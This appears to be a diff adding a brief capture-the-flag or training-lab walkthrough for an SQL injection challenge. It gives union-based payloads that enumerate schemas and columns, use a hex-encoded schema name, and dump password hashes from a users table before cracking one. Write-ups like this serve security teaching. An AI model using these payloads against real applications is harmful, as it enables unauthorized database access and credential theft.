@@ -1,0 +1,14 @@
+go to machine-ip/?page=member
+
+get the table_schema with tables names  
+    1 union select table_schema, table_name from INFORMATION_SCHEMA.Tables -> {Member_Sql_Injection, users}
+
+get tables names and column_names using below command:(0x4d656d6265725f53716c5f496e6a656374696f6e == Member_Sql_Injection)
+    1 union select column_name, table_name from INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 0x4d656d6265725f53716c5f496e6a656374696f6e
+
+get hash
+    1 union select countersign, Commentaire from Member_Sql_Injection.users
+
+decrypt the hash with md5 then encrypt it with sha256
+
+done.
